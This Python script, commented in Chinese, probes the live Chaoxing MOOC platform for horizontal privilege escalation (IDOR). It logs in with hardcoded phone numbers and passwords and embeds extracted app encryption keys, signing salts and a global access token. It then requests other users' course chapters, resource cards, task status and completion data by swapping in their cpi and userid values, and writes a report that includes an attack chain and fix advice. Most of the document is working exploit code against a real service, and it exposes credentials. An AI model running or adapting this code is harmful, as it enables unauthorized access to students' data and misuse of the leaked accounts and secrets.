import base64, hashlib, json, os, re, time, uuid, urllib.parse
from datetime import datetime
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
VIDEO_SALT = "d_yHJ!$pdA~5"
FACE_SALT = "uWwjeEKsri"
READ_SALT = "NrRzLDpWB2JkeodIVAn4"
HARDCODED_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"
DES_KEY = "Z(AfY@XS"

LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
MOBILE_UA = ("Mozilla/5.0 (Linux; Android 16; MI10) AppleWebKit/537.36 "
             "com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314")
REPORT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cpi_idor_deep_report.md")
results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [
        f"(schild:{SCHILD_SALT})",
        f"(device:{model})",
        f"Language/{locale}",
        f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
        f"(@Kalimdor)_{imei}",
    ]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua_with_schild():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session(); s.verify = False
    ua = get_mobile_ua_with_schild()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*",
                      "Accept-Language": "zh_CN"})
    r = s.post(LOGIN_URL, data={"fid":"-1","uname":aes_enc(phone),"password":aes_enc(pwd),
        "refer":"http%3A%2F%2Fi.mooc.chaoxing.com","t":"true","forbidotherlogin":"0",
        "validate":"","doubleFactorLogin":"0","independentId":"0","independentNameId":"0"},
        allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID","_uid"): puid = c.value

    # Visit i.chaoxing.com to get additional cookies (jrose, route, etc.)
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass

    # Visit mooc1-api to get domain-specific cookies
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass

    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"raw_status": r.status_code, "raw_text": r.text[:500]}

def rec(tid, name, api_endpoint, idor_type, vuln, sev, detail, evidence=""):
    results.append({"id":tid,"name":name,"api":api_endpoint,"idor_type":idor_type,
        "vuln":vuln,"sev":sev,"detail":detail,"evidence":evidence[:600]})
    tag = "[VULN]" if vuln else "[SAFE]"
    print(f"  {tag} {tid} [{api_endpoint}]: {detail[:100]}")

def get_courses(session):
    r = session.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    courses = []
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
        if course.get("id"):
            courses.append({
                "courseid": str(course.get("id", "")),
                "classid": str(c.get("id", "")),
                "cpi": str(c.get("cpi", "")),
                "name": c.get("name", "") or course.get("name", ""),
                "bbsid": str(c.get("bbsid", "")),
            })
    return courses

def run():
    print("="*70+f"\n课程CPI越权漏洞深入研究\n时间: {datetime.now():%Y-%m-%d %H:%M:%S}\n"+"="*70)

    print("\n[Task 1] 解决代理问题，获取完整Cookie...")
    s1, p1 = login("19312994130", "wtx3367653061")
    s2, p2 = login("15034188203", "lxy20030120")
    print(f"  账号1 puid={p1}, Cookie数={len(s1.cookies)}")
    print(f"  账号2 puid={p2}, Cookie数={len(s2.cookies)}")

    cookie_names_1 = [c.name for c in s1.cookies]
    print(f"  账号1 Cookie名: {cookie_names_1}")

    courses1 = get_courses(s1)
    courses2 = get_courses(s2)
    c1 = courses1[0] if courses1 else {}
    c2 = courses2[0] if courses2 else {}
    print(f"  账号1课程数={len(courses1)}, 首课: {c1.get('name','N/A')} (cpi={c1.get('cpi','')})")
    print(f"  账号2课程数={len(courses2)}, 首课: {c2.get('name','N/A')} (cpi={c2.get('cpi','')})")

    # Verify API access with full cookies
    r = s1.get("https://mooc1-api.chaoxing.com/gas/clazz", params={
        "id": c1.get("classid", "0"),
        "personid": c1.get("cpi", "0"),
        "fields": "id,bbsid,classscore,isstart,allowdownload,chatid,name,state,isfiled,visiblescore,hideclazz,begindate,forbidintoclazz,coursesetting.fields(id,courseid,hiddencoursecover,coursefacecheck),course.fields(id,belongschoolid,name,infocontent,objectid,app,bulletformat,mappingcourseid,imageurl,teacherfactor,jobcount,knowledge.fields(id,name,indexOrder,parentnodeid,status,isReview,layer,label,jobcount,begintime,endtime,attachment.fields(id,type,objectid,extension).type(video)))",
        "view": "json"
    }, timeout=20)
    api_accessible = r.status_code == 200 and len(r.text) > 100 and "login" not in r.text.lower()[:200]
    rec("T1-01", "代理问题解决验证", "/gas/clazz", "基线",
        api_accessible, "LOW",
        f"API访问{'成功' if api_accessible else '失败'}，HTTP {r.status_code}, 响应长度={len(r.text)}",
        f"响应前300字: {r.text[:300]}")

    if not api_accessible:
        print("  [!] API仍不可访问，尝试其他方法...")
        # Try with explicit Host header
        r = s1.get("https://mooc1-api.chaoxing.com/gas/clazz", params={
            "id": c1.get("classid", "0"),
            "personid": c1.get("cpi", "0"),
            "fields": "id,name",
            "view": "json"
        }, headers={"Host": "mooc1-api.chaoxing.com", "Connection": "Keep-Alive"}, timeout=20)
        print(f"  重试: HTTP {r.status_code}, 响应前200字: {r.text[:200]}")
        api_accessible = r.status_code == 200 and len(r.text) > 50

    # ================================================================
    # Task 2: 课程章节CPI越权测试（/gas/clazz）
    # ================================================================
    print("\n[Task 2] 课程章节CPI越权测试（/gas/clazz）")

    # T2-01: Baseline - own cpi
    r = s1.get("https://mooc1-api.chaoxing.com/gas/clazz", params={
        "id": c1.get("classid", "0"),
        "personid": c1.get("cpi", "0"),
        "fields": "id,name,course.fields(id,name,knowledge.fields(id,name,indexOrder,parentnodeid,status,layer,label,jobcount))",
        "view": "json"
    }, timeout=20)
    d = safe_json(r)
    own_chapter_ok = "course" in str(d) or "knowledge" in str(d) or "id" in str(d)
    rec("T2-01", "自己的cpi请求课程章节", "/gas/clazz", "基线",
        own_chapter_ok, "LOW",
        f"使用自己的cpi请求课程章节: {'成功' if own_chapter_ok else '失败'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T2-02: Cross-user cpi
    r = s1.get("https://mooc1-api.chaoxing.com/gas/clazz", params={
        "id": c2.get("classid", "0"),
        "personid": c2.get("cpi", "0"),
        "fields": "id,name,course.fields(id,name,knowledge.fields(id,name,indexOrder,parentnodeid,status,layer,label,jobcount))",
        "view": "json"
    }, timeout=20)
    d = safe_json(r)
    cross_chapter_ok = "course" in str(d) or "knowledge" in str(d) or "id" in str(d)
    rec("T2-02", "跨用户cpi请求课程章节", "/gas/clazz", "水平越权",
        cross_chapter_ok, "HIGH",
        f"使用账号1的Cookie+账号2的cpi请求课程章节: {'成功获取' if cross_chapter_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T2-03: Analyze chapter data sensitivity
    if cross_chapter_ok:
        chapter_data = d if isinstance(d, dict) else {}
        has_knowledge = "knowledge" in str(chapter_data)
        has_name = "name" in str(chapter_data)
        rec("T2-03", "章节数据敏感度分析", "/gas/clazz", "信息泄露",
            has_knowledge or has_name, "HIGH",
            f"越权获取的章节数据包含: 知识点列表={has_knowledge}, 章节名称={has_name}",
            f"数据字段: {list(chapter_data.keys()) if isinstance(chapter_data, dict) else 'N/A'}")

    # ================================================================
    # Task 3: 章节任务点状态CPI越权测试（/job/myjobsnodesmap）
    # ================================================================
    print("\n[Task 3] 章节任务点状态CPI越权测试（/job/myjobsnodesmap）")

    # First get chapter node IDs from PullChapter
    node_ids = []
    r = s1.get("https://mooc1-api.chaoxing.com/gas/clazz", params={
        "id": c1.get("classid", "0"),
        "personid": c1.get("cpi", "0"),
        "fields": "id,name,course.fields(id,name,knowledge.fields(id,name,indexOrder,parentnodeid,status,layer,label,jobcount))",
        "view": "json"
    }, timeout=20)
    d = safe_json(r)
    if isinstance(d, dict):
        try:
            course_data = d.get("course", {})
            if isinstance(course_data, dict):
                knowledge_list = course_data.get("knowledge", [])
                for k in knowledge_list[:5]:
                    if isinstance(k, dict) and k.get("id"):
                        node_ids.append(str(k["id"]))
        except:
            pass
    if not node_ids:
        node_ids = ["0"]

    # T3-01: Baseline
    r = s1.post("https://mooc1-api.chaoxing.com/job/myjobsnodesmap", data={
        "view": "json",
        "nodes": ",".join(node_ids),
        "clazzid": c1.get("classid", "0"),
        "time": str(int(time.time()*1000)),
        "userid": p1,
        "cpi": c1.get("cpi", "0"),
        "courseid": c1.get("courseid", "0"),
    }, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
    d = safe_json(r)
    own_status_ok = "result" in str(d) or "data" in str(d) or "map" in str(d)
    rec("T3-01", "自己的cpi请求任务点状态", "/job/myjobsnodesmap", "基线",
        own_status_ok, "LOW",
        f"使用自己的cpi请求任务点状态: {'成功' if own_status_ok else '失败'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T3-02: Cross-user cpi + target userid
    r = s1.post("https://mooc1-api.chaoxing.com/job/myjobsnodesmap", data={
        "view": "json",
        "nodes": ",".join(node_ids),
        "clazzid": c2.get("classid", "0"),
        "time": str(int(time.time()*1000)),
        "userid": p2,
        "cpi": c2.get("cpi", "0"),
        "courseid": c2.get("courseid", "0"),
    }, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
    d = safe_json(r)
    cross_status_ok = "result" in str(d) or "data" in str(d) or "map" in str(d)
    rec("T3-02", "跨用户cpi+目标userid请求任务点状态", "/job/myjobsnodesmap", "水平越权",
        cross_status_ok, "HIGH",
        f"使用账号1的Cookie+账号2的cpi+userid请求任务点状态: {'成功获取' if cross_status_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T3-03: Cross-user cpi + own userid (mismatch test)
    r = s1.post("https://mooc1-api.chaoxing.com/job/myjobsnodesmap", data={
        "view": "json",
        "nodes": ",".join(node_ids),
        "clazzid": c2.get("classid", "0"),
        "time": str(int(time.time()*1000)),
        "userid": p1,
        "cpi": c2.get("cpi", "0"),
        "courseid": c2.get("courseid", "0"),
    }, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
    d = safe_json(r)
    mismatch_ok = "result" in str(d) or "data" in str(d) or "map" in str(d)
    rec("T3-03", "跨用户cpi+自己userid请求任务点状态", "/job/myjobsnodesmap", "水平越权",
        mismatch_ok, "HIGH",
        f"使用账号1的Cookie+账号2的cpi+账号1的userid: {'成功' if mismatch_ok else '被拒绝'}，cpi与userid{'不绑定' if mismatch_ok else '绑定'}",
        f"HTTP {r.status_code}, 响应前300字: {r.text[:300]}")

    # ================================================================
    # Task 4: 知识节点详情CPI越权测试（/gas/knowledge）
    # ================================================================
    print("\n[Task 4] 知识节点详情CPI越权测试（/gas/knowledge）")

    # T4-01: Using K6 Token (no Cookie needed)
    r = s1.get("https://mooc1-api.chaoxing.com/gas/knowledge", params={
        "id": node_ids[0] if node_ids else "0",
        "courseid": c1.get("courseid", "0"),
        "fields": "id,parentnodeid,indexorder,label,layer,name,begintime,createtime,lastmodifytime,status,jobUnfinishedCount,clickcount,openlock,card.fields(id,knowledgeid,title,knowledgeTitile,description,cardorder).contentcard(all)",
        "view": "json",
        "token": HARDCODED_TOKEN,
        "_time": str(int(time.time()*1000)),
    }, timeout=20)
    d = safe_json(r)
    k6_knowledge_ok = "id" in str(d) or "name" in str(d) or "card" in str(d) or "data" in str(d)
    rec("T4-01", "K6 Token请求知识节点详情", "/gas/knowledge", "签名绕过越权",
        k6_knowledge_ok, "HIGH",
        f"使用K6 Token请求知识节点详情: {'成功' if k6_knowledge_ok else '失败'}，K6 Token{'不绑定' if k6_knowledge_ok else '绑定'}用户身份",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T4-02: K6 Token + target course's node
    r = s1.get("https://mooc1-api.chaoxing.com/gas/knowledge", params={
        "id": node_ids[0] if node_ids else "0",
        "courseid": c2.get("courseid", "0"),
        "fields": "id,parentnodeid,indexorder,label,layer,name,begintime,createtime,lastmodifytime,status,jobUnfinishedCount,clickcount,openlock,card.fields(id,knowledgeid,title,knowledgeTitile,description,cardorder).contentcard(all)",
        "view": "json",
        "token": HARDCODED_TOKEN,
        "_time": str(int(time.time()*1000)),
    }, timeout=20)
    d = safe_json(r)
    k6_cross_ok = "id" in str(d) or "name" in str(d) or "card" in str(d) or "data" in str(d)
    rec("T4-02", "K6 Token请求他人课程知识节点", "/gas/knowledge", "签名绕过越权",
        k6_cross_ok, "CRITICAL",
        f"使用K6 Token+他人courseId请求知识节点: {'成功(严重!)' if k6_cross_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T4-03: No Cookie, only K6 Token
    no_cookie_s = requests.Session(); no_cookie_s.verify = False
    no_cookie_s.headers.update({"User-Agent": get_mobile_ua_with_schild(), "Accept": "*/*",
                                 "Accept-Language": "zh_CN"})
    r = no_cookie_s.get("https://mooc1-api.chaoxing.com/gas/knowledge", params={
        "id": node_ids[0] if node_ids else "0",
        "courseid": c1.get("courseid", "0"),
        "fields": "id,name",
        "view": "json",
        "token": HARDCODED_TOKEN,
        "_time": str(int(time.time()*1000)),
    }, timeout=20)
    d = safe_json(r)
    no_cookie_k6_ok = "id" in str(d) or "name" in str(d) or "data" in str(d)
    rec("T4-03", "无Cookie仅K6 Token请求知识节点", "/gas/knowledge", "签名绕过越权",
        no_cookie_k6_ok, "CRITICAL",
        f"无Cookie仅使用K6 Token请求: {'成功(严重!K6 Token=万能密钥)' if no_cookie_k6_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应前300字: {r.text[:300]}")

    # ================================================================
    # Task 5: 知识卡片资源CPI越权测试（/mooc-ans/knowledge/cards）
    # ================================================================
    print("\n[Task 5] 知识卡片资源CPI越权测试（/mooc-ans/knowledge/cards）")

    # T5-01: Baseline
    r = s1.get("https://mooc1.chaoxing.com/mooc-ans/knowledge/cards", params={
        "clazzid": c1.get("classid", "0"),
        "courseid": c1.get("courseid", "0"),
        "knowledgeid": node_ids[0] if node_ids else "0",
        "num": "0",
        "ut": "s",
        "cpi": c1.get("cpi", "0"),
        "v": "2025-0424-1038-3",
        "mooc2": "1",
        "isMicroCourse": "false",
        "editorPreview": "0",
    }, timeout=20)
    d = safe_json(r)
    own_cards_ok = "data" in str(d) or "card" in str(d) or "attachments" in str(d) or "mArg" in r.text
    rec("T5-01", "自己的cpi请求知识卡片", "/mooc-ans/knowledge/cards", "基线",
        own_cards_ok, "LOW",
        f"使用自己的cpi请求知识卡片: {'成功' if own_cards_ok else '失败'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T5-02: Cross-user cpi
    r = s1.get("https://mooc1.chaoxing.com/mooc-ans/knowledge/cards", params={
        "clazzid": c2.get("classid", "0"),
        "courseid": c2.get("courseid", "0"),
        "knowledgeid": node_ids[0] if node_ids else "0",
        "num": "0",
        "ut": "s",
        "cpi": c2.get("cpi", "0"),
        "v": "2025-0424-1038-3",
        "mooc2": "1",
        "isMicroCourse": "false",
        "editorPreview": "0",
    }, timeout=20)
    d = safe_json(r)
    cross_cards_ok = "data" in str(d) or "card" in str(d) or "attachments" in str(d) or "mArg" in r.text
    rec("T5-02", "跨用户cpi请求知识卡片", "/mooc-ans/knowledge/cards", "水平越权",
        cross_cards_ok, "CRITICAL",
        f"使用账号1的Cookie+账号2的cpi请求知识卡片: {'成功获取(含视频/文档资源!)' if cross_cards_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T5-03: Analyze card data for sensitive resources
    if cross_cards_ok or own_cards_ok:
        has_video = "video" in r.text.lower() or "type" in r.text.lower()
        has_doc = "pdf" in r.text.lower() or "doc" in r.text.lower() or "textUrl" in r.text
        has_enc = "enc" in r.text or "authEnc" in r.text
        rec("T5-03", "知识卡片资源敏感度分析", "/mooc-ans/knowledge/cards", "信息泄露",
            has_video or has_doc, "HIGH",
            f"卡片数据包含: 视频={has_video}, 文档={has_doc}, 加密资源={has_enc}",
            f"资源类型统计: video={r.text.lower().count('video')}, pdf={r.text.lower().count('pdf')}")

    # ================================================================
    # Task 6: 进入章节CPI越权测试（/mooc-ans/mycourse/studentstudyAjax）
    # ================================================================
    print("\n[Task 6] 进入章节CPI越权测试（/mooc-ans/mycourse/studentstudyAjax）")

    # T6-01: Baseline
    r = s1.get("https://mooc1.chaoxing.com/mooc-ans/mycourse/studentstudyAjax", params={
        "courseId": c1.get("courseid", "0"),
        "clazzid": c1.get("classid", "0"),
        "chapterId": node_ids[0] if node_ids else "0",
        "cpi": c1.get("cpi", "0"),
        "verificationcode": "",
        "mooc2": "1",
        "toComputer": "false",
        "microTopicId": "0",
    }, timeout=20)
    d = safe_json(r)
    own_enter_ok = d.get("result") is not None or "status" in str(d)
    rec("T6-01", "自己的cpi进入章节", "/mooc-ans/mycourse/studentstudyAjax", "基线",
        own_enter_ok, "LOW",
        f"使用自己的cpi进入章节: {'成功' if own_enter_ok else '失败'}",
        f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # T6-02: Cross-user cpi
    r = s1.get("https://mooc1.chaoxing.com/mooc-ans/mycourse/studentstudyAjax", params={
        "courseId": c2.get("courseid", "0"),
        "clazzid": c2.get("classid", "0"),
        "chapterId": node_ids[0] if node_ids else "0",
        "cpi": c2.get("cpi", "0"),
        "verificationcode": "",
        "mooc2": "1",
        "toComputer": "false",
        "microTopicId": "0",
    }, timeout=20)
    d = safe_json(r)
    cross_enter_ok = d.get("result") is not None or "status" in str(d)
    rec("T6-02", "跨用户cpi进入章节", "/mooc-ans/mycourse/studentstudyAjax", "水平越权",
        cross_enter_ok, "HIGH",
        f"使用账号1的Cookie+账号2的cpi进入章节: {'成功' if cross_enter_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # ================================================================
    # Task 7: 课程完成度CPI越权测试（/mooc2-ans/mycourse/stu-job-info）
    # ================================================================
    print("\n[Task 7] 课程完成度CPI越权测试（/mooc2-ans/mycourse/stu-job-info）")

    # T7-01: Baseline
    clazz_person_str_1 = f"{c1.get('classid','0')}_{c1.get('cpi','0')}"
    r = s1.get("https://mooc2-ans.chaoxing.com/mooc2-ans/mycourse/stu-job-info", params={
        "clazzPersonStr": clazz_person_str_1,
    }, timeout=20)
    d = safe_json(r)
    own_complete_ok = "data" in str(d) or "result" in str(d) or "job" in str(d)
    rec("T7-01", "自己的clazzPersonStr请求完成度", "/mooc2-ans/mycourse/stu-job-info", "基线",
        own_complete_ok, "LOW",
        f"使用自己的clazzPersonStr请求完成度: {'成功' if own_complete_ok else '失败'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # T7-02: Cross-user clazzPersonStr
    clazz_person_str_2 = f"{c2.get('classid','0')}_{c2.get('cpi','0')}"
    r = s1.get("https://mooc2-ans.chaoxing.com/mooc2-ans/mycourse/stu-job-info", params={
        "clazzPersonStr": clazz_person_str_2,
    }, timeout=20)
    d = safe_json(r)
    cross_complete_ok = "data" in str(d) or "result" in str(d) or "job" in str(d)
    rec("T7-02", "跨用户clazzPersonStr请求完成度", "/mooc2-ans/mycourse/stu-job-info", "水平越权",
        cross_complete_ok, "HIGH",
        f"使用账号1的Cookie+账号2的clazzPersonStr请求完成度: {'成功获取' if cross_complete_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # ================================================================
    # Task 8: CPI获取方式评估
    # ================================================================
    print("\n[Task 8] CPI获取方式评估")

    # T8-01: CPI from course list API
    r = s1.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    cpi_in_course_list = False
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        if c.get("cpi"):
            cpi_in_course_list = True
            break
    rec("T8-01", "CPI是否可通过课程列表API获取", "课程列表API", "信息泄露",
        cpi_in_course_list, "MEDIUM",
        f"课程列表API{'包含' if cpi_in_course_list else '不包含'}cpi字段，cpi{'是' if cpi_in_course_list else '不是'}半公开信息",
        f"课程列表中cpi字段: {c1.get('cpi','N/A')}")

    # T8-02: CPI from group/bbs API
    c0 = uuid.uuid4().hex; t = str(int(time.time()*1000))
    from secrets_audit_test import inf_enc as calc_inf_enc
    ie = calc_inf_enc({"_c_0_":c0,"token":HARDCODED_TOKEN,"_time":t}, ["_c_0_","token","_time"])
    r = s1.get(f"https://groupyd.chaoxing.com/apis/group/myGroup?_c_0_={c0}&token={HARDCODED_TOKEN}&_time={t}&inf_enc={ie}",
               timeout=20)
    d = safe_json(r)
    cpi_in_group = "cpi" in str(d)
    rec("T8-02", "CPI是否可通过小组API获取", "小组API", "信息泄露",
        cpi_in_group, "MEDIUM",
        f"小组API{'包含' if cpi_in_group else '不包含'}cpi字段",
        f"响应前200字: {str(d)[:200]}")

    # ================================================================
    # Task 9: Generate Report
    # ================================================================
    print("\n[Task 9] 生成CPI越权深入评估报告...")
    gen_report(p1, p2, c1, c2, node_ids)

def gen_report(p1, p2, c1, c2, node_ids):
    vc = sum(1 for r in results if r["vuln"])
    tc = len(results)
    vs = {"CRITICAL":[],"HIGH":[],"MEDIUM":[],"LOW":[]}
    for r in results:
        if r["vuln"]: vs[r["sev"]].append(r)

    rp = []
    rp.append("# 课程CPI越权漏洞深入评估报告\n\n")
    rp.append(f"**审计日期**: {datetime.now():%Y-%m-%d %H:%M:%S}\n\n")
    rp.append(f"**测试账号**: 账号1(puid={p1}), 账号2(puid={p2})\n\n")
    rp.append(f"**测试范围**: 使用Go源码中发现的正确API端点进行课程CPI越权深入测试\n\n")

    rp.append("---\n\n## 一、测试结果汇总\n\n")
    rp.append(f"- **总测试数**: {tc}\n- **发现隐患数**: {vc}\n")
    rp.append(f"- **严重(CRITICAL)**: {len(vs['CRITICAL'])}\n- **高危(HIGH)**: {len(vs['HIGH'])}\n")
    rp.append(f"- **中危(MEDIUM)**: {len(vs['MEDIUM'])}\n- **低危(LOW)**: {len(vs['LOW'])}\n\n")

    rp.append("---\n\n## 二、各API端点测试结果\n\n")
    for r in results:
        st = "存在风险" if r["vuln"] else "安全"
        rp.append(f"### {r['id']}: {r['name']} [{st}]\n\n")
        rp.append(f"- **API端点**: `{r['api']}`\n")
        rp.append(f"- **越权类型**: {r['idor_type']}\n")
        rp.append(f"- **风险等级**: {r['sev']}\n")
        rp.append(f"- **结论**: {r['detail']}\n\n")
        if r["evidence"]:
            rp.append(f"- **证据**: {r['evidence']}\n\n")

    rp.append("---\n\n## 三、CPI越权完整攻击链\n\n")
    rp.append("```\n1. 获取目标用户的cpi（通过课程列表API或公开信息）\n")
    rp.append("2. 使用自己的Cookie+目标用户的cpi请求 /gas/clazz → 获取课程章节列表\n")
    rp.append("3. 使用K6 Token请求 /gas/knowledge → 获取知识节点详情（无需Cookie）\n")
    rp.append("4. 使用自己的Cookie+目标用户的cpi请求 /mooc-ans/knowledge/cards → 获取视频/文档资源\n")
    rp.append("5. 使用自己的Cookie+目标用户的cpi请求 /job/myjobsnodesmap → 获取任务点完成状态\n")
    rp.append("6. 使用自己的Cookie+目标用户的cpi请求 /mooc-ans/mycourse/studentstudyAjax → 进入章节\n")
    rp.append("7. 使用目标用户的clazzPersonStr请求 /mooc2-ans/mycourse/stu-job-info → 获取课程完成度\n```\n\n")

    rp.append("---\n\n## 四、修复建议\n\n")
    rp.append("### 4.1 紧急修复\n\n")
    rp.append("1. **cpi参数身份绑定**: 所有使用cpi参数的API必须校验cpi与Cookie/Token中的用户身份一致性\n")
    rp.append("2. **K6 Token移除**: /gas/knowledge接口使用的全局Token(K6)应立即移除，改用用户绑定Token\n")
    rp.append("3. **知识卡片访问控制**: /mooc-ans/knowledge/cards应校验请求者是否为课程成员\n\n")
    rp.append("### 4.2 中期加固\n\n")
    rp.append("4. **cpi动态化**: cpi应包含时效性和身份绑定信息\n")
    rp.append("5. **clazzPersonStr校验**: 课程完成度接口应校验clazzPersonStr与Cookie身份的绑定关系\n")
    rp.append("6. **API统一认证**: 所有课程相关API应实施统一的身份校验机制\n\n")

    with open(REPORT, "w", encoding="utf-8") as f:
        f.write("\n".join(rp))
    print(f"  报告: {REPORT}")
    print(f"  共{tc}项, {vc}项隐患")
    print(f"  CRITICAL={len(vs['CRITICAL'])}, HIGH={len(vs['HIGH'])}, MEDIUM={len(vs['MEDIUM'])}, LOW={len(vs['LOW'])}")
    print("="*70)

if __name__ == "__main__":
    import urllib3; urllib3.disable_warnings()
    run()
